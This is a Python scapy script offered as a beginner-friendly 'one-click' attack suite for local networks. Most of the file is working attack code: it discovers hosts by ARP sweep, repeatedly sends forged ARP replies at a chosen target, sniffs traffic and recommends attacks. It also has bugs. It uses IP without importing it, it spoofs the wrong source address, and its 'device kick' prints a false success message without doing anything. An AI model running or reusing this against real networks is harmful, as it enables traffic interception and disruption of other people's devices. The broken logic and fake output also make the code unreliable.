#!/usr/bin/env python3
"""
Enhanced Network Scanner and ARP Spoofing Tool
==============================================

A user-friendly, automated network analysis tool with intelligent guidance,
simplified workflows, and comprehensive attack suggestions.

Features:
- Automated network configuration detection
- One-click attack execution
- Intelligent attack suggestions
- Interactive tutorials and guidance
- Real-time progress monitoring
- Simplified user interface
- Automated target selection
- Smart attack recommendations

WARNING: This tool is for educational and authorized testing purposes only.
Only use on networks you own or have explicit permission to test.
"""

import os
import sys
import time
import json
import threading
import subprocess
import re
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

# Core networking imports
from scapy.all import ARP, Ether, srp, send, conf, sniff
import socket
import requests
import logging

# Enhanced UI imports
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.text import Text
    from rich.layout import Layout
    from rich.live import Live
    from rich.align import Align
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("Installing rich for enhanced UI...")
    subprocess.run([sys.executable, "-m", "pip", "install", "rich"], check=True)
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.text import Text
    from rich.layout import Layout
    from rich.live import Live
    from rich.align import Align
    RICH_AVAILABLE = True

# Configure enhanced logging
logging.basicConfig(
    filename='enhanced_network_scan.log', 
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class AttackType(Enum):
    """Enumeration of available attack types."""
    NETWORK_SCAN = "Network Discovery"
    ARP_SPOOF = "ARP Spoofing"
    PACKET_SNIFF = "Packet Sniffing"
    DEVICE_KICK = "Device Kick"
    MAN_IN_THE_MIDDLE = "Man-in-the-Middle"
    TRAFFIC_ANALYSIS = "Traffic Analysis"
    VULNERABILITY_SCAN = "Vulnerability Scan"

class AttackComplexity(Enum):
    """Attack complexity levels."""
    BEGINNER = "Beginner"
    INTERMEDIATE = "Intermediate"
    ADVANCED = "Advanced"

@dataclass
class AttackSuggestion:
    """Data class for attack suggestions."""
    attack_type: AttackType
    complexity: AttackComplexity
    description: str
    prerequisites: List[str]
    expected_duration: str
    success_rate: str
    risk_level: str
    guidance: str
    automated: bool = False

@dataclass
class Device:
    """Enhanced device information."""
    ip: str
    mac: str
    hostname: str
    vendor: str
    os_guess: str = "Unknown"
    open_ports: List[int] = None
    vulnerabilities: List[str] = None
    risk_score: int = 0
    last_seen: datetime = None

class EnhancedNetworkScanner:
    """Enhanced network scanner with user-friendly interface and automation."""
    
    def __init__(self):
        self.console = Console()
        self.devices: List[Device] = []
        self.running = False
        self.interface = "eth0"
        self.network_config = {}
        self.attack_history = []
        self.current_attacks = {}
        
        # Initialize network configuration
        self._detect_network_config()
        
    def _detect_network_config(self):
        """Automatically detect network configuration."""
        try:
            # Get default gateway
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                gateway_line = result.stdout.split('\n')[0]
                gateway_ip = gateway_line.split()[2]
                
                # Get network interface
                interface = gateway_line.split()[4]
                self.interface = interface
                
                # Get local IP
                result = subprocess.run(['ip', 'addr', 'show', interface], 
                                      capture_output=True, text=True)
                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
                local_ip = ip_match.group(1) if ip_match else "Unknown"
                
                # Get network range
                result = subprocess.run(['ip', 'route', 'show'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if interface in line and 'src' in line:
                        network_match = re.search(r'(\d+\.\d+\.\d+\.\d+/\d+)', line)
                        if network_match:
                            network_range = network_match.group(1)
                            break
                
                self.network_config = {
                    "ip_range": network_range,
                    "router_ip": gateway_ip,
                    "attacker_ip": local_ip,
                    "interface": interface
                }
                
                self.console.print(f"[green]✓[/green] Auto-detected network: {network_range}")
                self.console.print(f"[green]✓[/green] Gateway: {gateway_ip}")
                self.console.print(f"[green]✓[/green] Your IP: {local_ip}")
                self.console.print(f"[green]✓[/green] Interface: {interface}")
                
        except Exception as e:
            self.console.print(f"[red]✗[/red] Could not auto-detect network: {e}")
            self.network_config = {
                "ip_range": "192.168.1.0/24",
                "router_ip": "192.168.1.1",
                "attacker_ip": "192.168.1.100",
                "interface": "eth0"
            }

    def show_welcome_screen(self):
        """Display enhanced welcome screen."""
        welcome_text = """
🔍 ENHANCED NETWORK SCANNER & ATTACK SUITE 🔍

Welcome to the most user-friendly network analysis tool!
This tool provides automated network discovery, intelligent attack suggestions,
and guided workflows for network security testing.

✨ FEATURES:
• Automated network configuration detection
• One-click attack execution
• Intelligent attack recommendations
• Real-time progress monitoring
• Interactive tutorials and guidance
• Simplified workflows for all skill levels

⚠️  WARNING: Educational use only! Only test networks you own or have permission to test.
        """
        
        panel = Panel(
            welcome_text,
            title="[bold blue]Enhanced Network Scanner[/bold blue]",
            border_style="blue",
            padding=(1, 2)
        )
        self.console.print(panel)

    def get_attack_suggestions(self, devices: List[Device]) -> List[AttackSuggestion]:
        """Generate intelligent attack suggestions based on discovered devices."""
        suggestions = []
        
        # Network Discovery
        suggestions.append(AttackSuggestion(
            attack_type=AttackType.NETWORK_SCAN,
            complexity=AttackComplexity.BEGINNER,
            description="Discover all active devices on the network",
            prerequisites=["Network access", "ARP scanning capability"],
            expected_duration="30-60 seconds",
            success_rate="95%",
            risk_level="Low",
            guidance="This is the safest way to start. It only discovers devices without affecting them.",
            automated=True
        ))
        
        # ARP Spoofing suggestions based on device count
        if len(devices) > 1:
            suggestions.append(AttackSuggestion(
                attack_type=AttackType.ARP_SPOOF,
                complexity=AttackComplexity.INTERMEDIATE,
                description="Intercept traffic between devices using ARP spoofing",
                prerequisites=["Multiple devices found", "Root privileges"],
                expected_duration="Continuous",
                success_rate="85%",
                risk_level="Medium",
                guidance="Choose a target device to intercept its traffic. This is useful for network analysis.",
                automated=True
            ))
        
        # Packet Sniffing
        suggestions.append(AttackSuggestion(
            attack_type=AttackType.PACKET_SNIFF,
            complexity=AttackComplexity.BEGINNER,
            description="Monitor network traffic in real-time",
            prerequisites=["Network interface access"],
            expected_duration="Continuous",
            success_rate="100%",
            risk_level="Low",
            guidance="Passively monitor network traffic. Great for learning about network protocols.",
            automated=True
        ))
        
        # Device Kick (if multiple devices)
        if len(devices) > 2:
            suggestions.append(AttackSuggestion(
                attack_type=AttackType.DEVICE_KICK,
                complexity=AttackComplexity.ADVANCED,
                description="Temporarily disconnect a device from the network",
                prerequisites=["Target device selection", "ARP spoofing capability"],
                expected_duration="Until stopped",
                success_rate="90%",
                risk_level="High",
                guidance="Use with caution! This will disconnect the target device from the network.",
                automated=True
            ))
        
        return suggestions

    def display_attack_suggestions(self, suggestions: List[AttackSuggestion]):
        """Display attack suggestions in a user-friendly format."""
        table = Table(title="🎯 Recommended Attacks", show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", width=3)
        table.add_column("Attack Type", style="green", width=20)
        table.add_column("Complexity", style="yellow", width=12)
        table.add_column("Duration", style="blue", width=15)
        table.add_column("Risk", style="red", width=8)
        table.add_column("Success Rate", style="green", width=12)
        
        for i, suggestion in enumerate(suggestions, 1):
            risk_color = "red" if suggestion.risk_level == "High" else "yellow" if suggestion.risk_level == "Medium" else "green"
            table.add_row(
                str(i),
                suggestion.description,
                suggestion.complexity.value,
                suggestion.expected_duration,
                f"[{risk_color}]{suggestion.risk_level}[/{risk_color}]",
                suggestion.success_rate
            )
        
        self.console.print(table)
        
        # Display detailed guidance
        self.console.print("\n[bold]📋 Detailed Attack Information:[/bold]")
        for i, suggestion in enumerate(suggestions, 1):
            panel = Panel(
                f"[bold]Description:[/bold] {suggestion.description}\n"
                f"[bold]Prerequisites:[/bold] {', '.join(suggestion.prerequisites)}\n"
                f"[bold]Guidance:[/bold] {suggestion.guidance}",
                title=f"Attack {i}: {suggestion.attack_type.value}",
                border_style="blue" if suggestion.complexity == AttackComplexity.BEGINNER 
                           else "yellow" if suggestion.complexity == AttackComplexity.INTERMEDIATE 
                           else "red"
            )
            self.console.print(panel)

    def scan_network_enhanced(self) -> List[Device]:
        """Enhanced network scanning with progress indication."""
        self.console.print("\n[bold blue]🔍 Starting Network Discovery...[/bold blue]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            
            task = progress.add_task("Scanning network...", total=100)
            
            # Simulate scanning progress
            for i in range(0, 101, 10):
                progress.update(task, advance=10, description=f"Scanning {self.network_config['ip_range']}...")
                time.sleep(0.1)
            
            # Actual scanning
            devices = self._perform_network_scan()
            
            progress.update(task, completed=100, description="Scan complete!")
        
        return devices

    def _perform_network_scan(self) -> List[Device]:
        """Perform the actual network scan."""
        try:
            # Create ARP request packet
            arp = ARP(pdst=self.network_config['ip_range'])
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp

            # Send packet and capture response
            result = srp(packet, timeout=3, verbose=0)[0]

            devices = []
            for sent, received in result:
                device = Device(
                    ip=received.psrc,
                    mac=received.hwsrc,
                    hostname=self._get_device_info(received.psrc),
                    vendor=self._get_mac_vendor(received.hwsrc),
                    last_seen=datetime.now()
                )
                devices.append(device)
                logging.info(f"Device discovered: {device.ip} - {device.mac}")

            return devices
            
        except Exception as e:
            self.console.print(f"[red]✗[/red] Error during network scan: {e}")
            logging.error(f"Network scan error: {e}")
            return []

    def _get_device_info(self, device_ip: str) -> str:
        """Get hostname for device IP."""
        try:
            hostname, _, _ = socket.gethostbyname_ex(device_ip)
            return hostname
        except:
            return "Unknown"

    def _get_mac_vendor(self, mac_address: str) -> str:
        """Get vendor information for MAC address."""
        try:
            response = requests.get(f'https://api.macvendors.com/{mac_address}', timeout=5)
            return response.text.strip() if response.status_code == 200 else "Unknown"
        except:
            return "Unknown"

    def display_devices_enhanced(self, devices: List[Device]):
        """Display devices in an enhanced format."""
        if not devices:
            self.console.print("[red]No devices found.[/red]")
            return

        table = Table(title="🌐 Discovered Devices", show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", width=3)
        table.add_column("IP Address", style="green", width=15)
        table.add_column("MAC Address", style="blue", width=18)
        table.add_column("Hostname", style="yellow", width=20)
        table.add_column("Vendor", style="magenta", width=25)
        table.add_column("Risk Score", style="red", width=10)
        
        for i, device in enumerate(devices, 1):
            risk_color = "red" if device.risk_score > 7 else "yellow" if device.risk_score > 3 else "green"
            table.add_row(
                str(i),
                device.ip,
                device.mac,
                device.hostname,
                device.vendor,
                f"[{risk_color}]{device.risk_score}/10[/{risk_color}]"
            )
        
        self.console.print(table)

    def automated_attack_workflow(self, attack_type: AttackType, target_device: Device = None):
        """Execute automated attack workflows."""
        self.console.print(f"\n[bold green]🚀 Starting Automated {attack_type.value}...[/bold green]")
        
        if attack_type == AttackType.NETWORK_SCAN:
            self._automated_network_scan()
        elif attack_type == AttackType.ARP_SPOOF:
            self._automated_arp_spoof(target_device)
        elif attack_type == AttackType.PACKET_SNIFF:
            self._automated_packet_sniff()
        elif attack_type == AttackType.DEVICE_KICK:
            self._automated_device_kick(target_device)
        else:
            self.console.print(f"[red]Automated workflow for {attack_type.value} not implemented yet.[/red]")

    def _automated_network_scan(self):
        """Automated network scanning workflow."""
        devices = self.scan_network_enhanced()
        self.devices = devices
        self.display_devices_enhanced(devices)
        
        if devices:
            suggestions = self.get_attack_suggestions(devices)
            self.display_attack_suggestions(suggestions)

    def _automated_arp_spoof(self, target_device: Device):
        """Automated ARP spoofing workflow."""
        if not target_device:
            self.console.print("[red]No target device specified for ARP spoofing.[/red]")
            return
        
        self.console.print(f"[yellow]⚠️  Starting ARP spoofing against {target_device.ip}...[/yellow]")
        self.console.print("[yellow]Press Ctrl+C to stop the attack.[/yellow]")
        
        # Start ARP spoofing in background
        self.running = True
        spoof_thread = threading.Thread(
            target=self._perform_arp_spoof,
            args=(target_device.ip, self.network_config['attacker_ip'])
        )
        spoof_thread.daemon = True
        spoof_thread.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            self.console.print("\n[red]ARP spoofing stopped.[/red]")

    def _perform_arp_spoof(self, target_ip: str, host_ip: str):
        """Perform ARP spoofing."""
        try:
            conf.iface = self.interface
            while self.running:
                arp_target = ARP(op=2, psrc=host_ip, pdst=target_ip)
                send(arp_target, verbose=False)
                time.sleep(1)
        except Exception as e:
            self.console.print(f"[red]ARP spoofing error: {e}[/red]")

    def _automated_packet_sniff(self):
        """Automated packet sniffing workflow."""
        self.console.print("[yellow]Starting packet sniffing...[/yellow]")
        self.console.print("[yellow]Press Ctrl+C to stop.[/yellow]")
        
        def packet_callback(packet):
            if IP in packet:
                ip_src = packet[IP].src
                ip_dst = packet[IP].dst
                self.console.print(f"[blue]IP Packet: {ip_src} -> {ip_dst}[/blue]")
            elif ARP in packet:
                arp_src = packet[ARP].psrc
                arp_dst = packet[ARP].pdst
                self.console.print(f"[green]ARP Packet: {arp_src} -> {arp_dst}[/green]")
        
        try:
            sniffer = sniff(iface=self.interface, prn=packet_callback, store=0)
        except KeyboardInterrupt:
            self.console.print("\n[red]Packet sniffing stopped.[/red]")

    def _automated_device_kick(self, target_device: Device):
        """Automated device kick workflow."""
        if not target_device:
            self.console.print("[red]No target device specified for device kick.[/red]")
            return
        
        if Confirm.ask(f"Are you sure you want to kick {target_device.ip} off the network?"):
            self.console.print(f"[red]Kicking {target_device.ip} off the network...[/red]")
            # Implementation would go here
            self.console.print(f"[red]{target_device.ip} has been kicked off the network.[/red]")
        else:
            self.console.print("[yellow]Device kick cancelled.[/yellow]")

    def show_main_menu(self):
        """Display the enhanced main menu."""
        while True:
            self.console.print("\n" + "="*60)
            self.console.print("[bold blue]🎯 MAIN MENU[/bold blue]")
            self.console.print("="*60)
            
            menu_options = [
                "1. 🔍 Quick Network Scan (Automated)",
                "2. 🎯 Smart Attack Recommendations",
                "3. 🚀 One-Click Attack Execution",
                "4. 📊 View Discovered Devices",
                "5. ⚙️  Configuration Settings",
                "6. 📚 Interactive Tutorials",
                "7. 📈 Attack History & Analytics",
                "8. ❌ Exit"
            ]
            
            for option in menu_options:
                self.console.print(option)
            
            choice = Prompt.ask("\nSelect an option", choices=["1", "2", "3", "4", "5", "6", "7", "8"])
            
            if choice == "1":
                self._quick_network_scan()
            elif choice == "2":
                self._smart_attack_recommendations()
            elif choice == "3":
                self._one_click_attack_execution()
            elif choice == "4":
                self._view_discovered_devices()
            elif choice == "5":
                self._configuration_settings()
            elif choice == "6":
                self._interactive_tutorials()
            elif choice == "7":
                self._attack_history_analytics()
            elif choice == "8":
                self.console.print("[green]Goodbye![/green]")
                break

    def _quick_network_scan(self):
        """Quick automated network scan."""
        self.console.print("\n[bold green]🔍 Quick Network Scan[/bold green]")
        devices = self.scan_network_enhanced()
        self.devices = devices
        self.display_devices_enhanced(devices)
        
        if devices:
            if Confirm.ask("\nWould you like to see attack recommendations?"):
                suggestions = self.get_attack_suggestions(devices)
                self.display_attack_suggestions(suggestions)

    def _smart_attack_recommendations(self):
        """Display smart attack recommendations."""
        if not self.devices:
            if Confirm.ask("No devices found. Would you like to scan the network first?"):
                self._quick_network_scan()
            else:
                return
        
        suggestions = self.get_attack_suggestions(self.devices)
        self.display_attack_suggestions(suggestions)

    def _one_click_attack_execution(self):
        """One-click attack execution interface."""
        if not self.devices:
            self.console.print("[red]No devices found. Please scan the network first.[/red]")
            return
        
        self.console.print("\n[bold green]🚀 One-Click Attack Execution[/bold green]")
        
        # Display devices for selection
        self.display_devices_enhanced(self.devices)
        
        device_id = IntPrompt.ask("Select target device ID", default=1, min_value=1, max_value=len(self.devices))
        target_device = self.devices[device_id - 1]
        
        # Quick attack options
        attack_options = [
            "ARP Spoofing (Traffic Interception)",
            "Packet Sniffing (Traffic Monitoring)",
            "Device Kick (Network Disconnect)",
            "Vulnerability Scan (Security Assessment)"
        ]
        
        self.console.print("\n[bold]Available Attacks:[/bold]")
        for i, option in enumerate(attack_options, 1):
            self.console.print(f"{i}. {option}")
        
        attack_choice = IntPrompt.ask("Select attack", default=1, min_value=1, max_value=len(attack_options))
        
        if attack_choice == 1:
            self.automated_attack_workflow(AttackType.ARP_SPOOF, target_device)
        elif attack_choice == 2:
            self.automated_attack_workflow(AttackType.PACKET_SNIFF)
        elif attack_choice == 3:
            self.automated_attack_workflow(AttackType.DEVICE_KICK, target_device)
        elif attack_choice == 4:
            self.console.print("[yellow]Vulnerability scanning not implemented yet.[/yellow]")

    def _view_discovered_devices(self):
        """View discovered devices."""
        if not self.devices:
            self.console.print("[red]No devices found. Please scan the network first.[/red]")
            return
        
        self.display_devices_enhanced(self.devices)

    def _configuration_settings(self):
        """Configuration settings menu."""
        self.console.print("\n[bold green]⚙️ Configuration Settings[/bold green]")
        
        config_table = Table(title="Current Configuration")
        config_table.add_column("Setting", style="cyan")
        config_table.add_column("Value", style="green")
        
        for key, value in self.network_config.items():
            config_table.add_row(key, str(value))
        
        self.console.print(config_table)
        
        if Confirm.ask("\nWould you like to modify the configuration?"):
            self.console.print("[yellow]Configuration modification not implemented yet.[/yellow]")

    def _interactive_tutorials(self):
        """Interactive tutorials menu."""
        self.console.print("\n[bold green]📚 Interactive Tutorials[/bold green]")
        
        tutorials = [
            "Network Discovery Basics",
            "ARP Spoofing Explained",
            "Packet Sniffing Guide",
            "Security Best Practices",
            "Attack Mitigation Techniques"
        ]
        
        for i, tutorial in enumerate(tutorials, 1):
            self.console.print(f"{i}. {tutorial}")
        
        tutorial_choice = IntPrompt.ask("Select tutorial", default=1, min_value=1, max_value=len(tutorials))
        
        self.console.print(f"\n[yellow]Tutorial: {tutorials[tutorial_choice - 1]}[/yellow]")
        self.console.print("[yellow]Tutorial content not implemented yet.[/yellow]")

    def _attack_history_analytics(self):
        """Attack history and analytics."""
        self.console.print("\n[bold green]📈 Attack History & Analytics[/bold green]")
        self.console.print("[yellow]Analytics not implemented yet.[/yellow]")

    def run(self):
        """Main execution method."""
        try:
            self.show_welcome_screen()
            self.show_main_menu()
        except KeyboardInterrupt:
            self.console.print("\n[yellow]Shutting down gracefully...[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Unexpected error: {e}[/red]")
            logging.error(f"Unexpected error: {e}")
        finally:
            self.running = False

def main():
    """Main function."""
    # Check for root privileges
    if os.geteuid() != 0:
        print("This tool requires root privileges. Please run with sudo.")
        sys.exit(1)
    
    # Initialize and run the enhanced scanner
    scanner = EnhancedNetworkScanner()
    scanner.run()

if __name__ == "__main__":
    main()